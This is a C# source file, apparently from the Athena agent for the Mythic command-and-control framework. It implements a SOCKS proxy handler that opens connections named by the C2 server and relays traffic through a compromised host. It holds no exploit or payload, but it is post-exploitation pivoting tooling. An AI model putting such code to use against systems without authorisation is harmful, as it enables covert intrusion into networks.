using Athena.Models.Athena.Socks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Commands.Model
{

    public class SocksHandler
    {
        private CancellationTokenSource ct { get; set; }
        private ConcurrentDictionary<int, AthenaSocksConnection> connections { get; set; }
        private ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();
        public bool running { get; set; }

        public SocksHandler()
        {
            this.running = false;
            //this.connections = new Dictionary<int, SocksConnection>();
            this.connections = new ConcurrentDictionary<int, AthenaSocksConnection>();

        }

        /// <summary>
        /// Start the SOCKS Listener
        /// </summary>
        public async Task<bool> Start()
        {
            this.ct = new CancellationTokenSource();
            //this.connections = new Dictionary<int, SocksConnection>();
            this.connections = new ConcurrentDictionary<int, AthenaSocksConnection>();
            this.messagesOut = new ConcurrentBag<SocksMessage>();

            return true;
        }

        /// <summary>
        /// Stops the SOCKS Listener
        /// </summary>
        public async Task<bool> Stop()
        {
            try
            {
                if (!this.running)
                {
                    return true;
                }

                this.running = false;

                if (this.ct is not null)
                {
                    this.ct.Cancel();
                }

                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine("[Stop]");
                Console.WriteLine(e);
                return false;
            }
        }

        /// <summary>
        /// Add a connection to the tracker dictionary
        /// </summary>
        /// <param name="conn">Socks Connection</param>
        public async Task<bool> AddConnection(AthenaSocksConnection conn)
        {
            this.connections.GetOrAdd(conn.server_id, conn);
            return true;
        }

        /// <summary>
        /// Remove connection from the tracker dictionary
        /// </summary>
        /// <param name="conn">Connection ID</param>
        public async Task<bool> RemoveConnection(int conn)
        {
            try
            {
                this.connections.TryRemove(conn, out _);
            }
            catch
            {

            }
            return true;
        }

        /// <summary>
        /// Get messages from the out dictionary to forward to the Mythic server
        /// </summary>
        public async Task<List<SocksMessage>> GetMessages()
        {
            if (this.messagesOut.Count < 1)
            {
                return new List<SocksMessage>();
            }

            List<SocksMessage> msgOut = new List<SocksMessage>(this.messagesOut);
            this.messagesOut.Clear();
            msgOut.Reverse();
            return msgOut;
        }

        /// <summary>
        /// Handle a new message forwarded from the Mythic server
        /// </summary>
        /// <param name="sm">Socks Message</param>
        public async Task HandleMessage(SocksMessage sm)
        {
            if (this.connections.ContainsKey(sm.server_id))
            {
                AthenaSocksConnection conn = this.connections[sm.server_id];
                while (conn.IsConnecting) { }; //packet arrived before it was finished connecting

                if (conn.IsConnected)
                {
                    conn.SendAsync(await Misc.Base64DecodeToByteArrayAsync(sm.data));
                }
                else
                {
                    await RemoveConnection(conn.server_id);
                }
            }
            else
            {
                await HandleNewConnection(sm);
            }
        }

        /// <summary>
        /// Handle a new connection forwarded from the Mythic server
        /// </summary>
        /// <param name="address">IP address</param>
        /// <param name="sm">Socks Message</param>
        private async Task HandleNewConnection(SocksMessage sm)
        {
            try
            {
                if (String.IsNullOrEmpty(sm.data))
                {
                    return;
                }

                ConnectionOptions co = new ConnectionOptions(sm); //Create new ConnectionOptions
                AthenaSocksConnection sc = new AthenaSocksConnection(co); //Create Socks Connection Object
                sc.ActionQueueMessage = ReturnMessage;

                await AddConnection(sc); //Add our connection to the Dictionary


                Task.Run(async () =>
                {
                    try
                    {
                        sc.ConnectAsync();
                        while (sc.IsConnecting) { };

                        if (!sc.IsConnected)
                        {
                            this.messagesOut.Add(new SocksMessage
                            {
                                server_id = sc.server_id,
                                data = Misc.Base64Encode(new ConnectResponse
                                {
                                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                                    bndport = new byte[] { 0x00, 0x00 },
                                    addrtype = co.addressType,
                                    status = ConnectResponseStatus.GeneralFailure,

                                }.ToByte()).Result,
                            });
                        }
                    }
                    catch
                    {
                        this.messagesOut.Add(new SocksMessage
                        {
                            server_id = sc.server_id,
                            data = Misc.Base64Encode(new ConnectResponse
                            {
                                bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                                bndport = new byte[] { 0x00, 0x00 },
                                addrtype = co.addressType,
                                status = ConnectResponseStatus.GeneralFailure

                            }.ToByte()).Result,
                        });
                    }
                });
            }
            catch (Exception e)
            {
                this.messagesOut.Add(new SocksMessage
                {
                    server_id = sm.server_id,
                    exit = true,
                    data = await Misc.Base64Encode(new ConnectResponse
                    {
                        bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                        bndport = new byte[] { 0x00, 0x00 },
                        status = ConnectResponseStatus.GeneralFailure,
                    }.ToByte())
                });
            }
        }

        /// <summary>
        /// Add a message to the out queue to be returned to the Mythic server
        /// </summary>
        /// <param name="sm">Socks Message</param>
        public void ReturnMessage(SocksMessage sm)
        {
            //If a message gets deleted before this gets called, then I throw an error
            this.messagesOut.Add(sm);
        }
    }
}